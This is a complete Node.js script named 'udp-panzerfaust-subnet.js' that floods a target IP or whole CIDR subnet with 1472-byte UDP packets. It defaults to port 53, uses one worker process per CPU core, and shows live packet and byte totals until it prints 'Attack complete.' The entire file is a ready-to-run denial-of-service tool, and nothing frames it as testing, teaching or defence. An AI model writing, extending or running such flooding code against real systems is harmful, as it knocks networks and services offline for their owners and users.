const dgram = require('dgram');
const cluster = require('cluster');
const os = require('os');
const { networkInterfaces } = require('os');

const ip = require('ip'); // requires `npm install ip`

// ========== INPUT ==========
const subnet = process.argv[2]; // Can be CIDR or single IP
const port = parseInt(process.argv[3]) || 53;
const duration = parseInt(process.argv[4]);

if (!subnet || isNaN(duration)) {
  console.log('Usage: node udp-panzerfaust-subnet.js <target_cidr> <port> <duration_seconds>');
  process.exit(1);
}

// ========== TARGETS ==========
let targets = [];

if (ip.isV4Format(subnet)) {
  targets = [subnet];
} else if (ip.cidrSubnet(subnet)) {
  const range = ip.cidrSubnet(subnet);
  let current = ip.toLong(range.firstAddress);
  const last = ip.toLong(range.lastAddress);

  while (current <= last) {
    targets.push(ip.fromLong(current));
    current++;
  }
} else {
  console.error('Invalid IP or CIDR subnet');
  process.exit(1);
}

// ========== CONFIG ==========
const payloadSize = 1472;
const cpuCount = os.cpus().length;
const payload = Buffer.alloc(payloadSize);
const endTime = Date.now() + duration * 1000;

// ========== FORMATTERS ==========
function formatNumber(n) {
  const units = ['', 'K', 'M', 'B', 'T'];
  let i = 0;
  while (n >= 1000 && i < units.length - 1) {
    n /= 1000;
    i++;
  }
  return `${n.toFixed(2)}${units[i]}`;
}

function formatBytes(bytes) {
  const units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB'];
  let i = 0;
  while (bytes >= 1024 && i < units.length - 1) {
    bytes /= 1024;
    i++;
  }
  return `${bytes.toFixed(2)} ${units[i]}`;
}

// ========== MASTER ==========
if (cluster.isMaster) {
  let totalSent = 0;
  let totalBytes = 0;

  console.clear();
  console.log('UDP-PANZERFAUST [HEAVY + SUBNET]');
  console.log('--------------------------------------');
  console.log(`Target Subnet:         ${subnet}`);
  console.log(`Targets Count:         ${targets.length}`);
  console.log(`Port:                  ${port}`);
  console.log(`Duration:              ${duration}s`);
  console.log(`Payload:               ${payloadSize} bytes`);
  console.log(`Cores:                 ${cpuCount}`);
  console.log('Launching...\n');

  for (let i = 0; i < cpuCount; i++) {
    const worker = cluster.fork();
    worker.send({ targets });
  }

  for (const id in cluster.workers) {
    cluster.workers[id].on('message', (msg) => {
      if (msg.type === 'stats') {
        totalSent += msg.sent;
        totalBytes += msg.bytes;
      }
    });
  }

  setInterval(() => {
    console.clear();
    console.log('UDP-PANZERFAUST [HEAVY + SUBNET]');
    console.log('--------------------------------------');
    console.log(`Total Packets Sent:    ${formatNumber(totalSent)}`);
    console.log(`Data Sent:             ${formatBytes(totalBytes)}`);
    console.log(`Target Subnet:         ${subnet}`);
    console.log(`Payload:               ${payloadSize} bytes`);
    console.log('--------------------------------------');
  }, 5000);

  setTimeout(() => {
    console.log('\nAttack complete.');
    for (const id in cluster.workers) cluster.workers[id].kill();
    process.exit(0);
  }, duration * 1000);

  // ========== WORKER ==========
} else {
  const sock = dgram.createSocket('udp4');

  sock.bind(() => {
    sock.setSendBufferSize(4 * 1024 * 1024);
  });

  let sent = 0;
  let bytes = 0;
  let targets = [];
  let targetIndex = 0;

  process.on('message', (msg) => {
    if (msg.targets) {
      targets = msg.targets;
      flood();
    }
  });

  function flood() {
    function loop() {
      if (Date.now() > endTime) return;

      for (let i = 0; i < 100; i++) {
        const ip = targets[targetIndex];
        targetIndex = (targetIndex + 1) % targets.length;

        sock.send(payload, port, ip);
        sent++;
        bytes += payloadSize;
      }

      setImmediate(loop);
    }

    loop();
  }

  setInterval(() => {
    process.send({ type: 'stats', sent, bytes });
    sent = 0;
    bytes = 0;
  }, 1000);
}
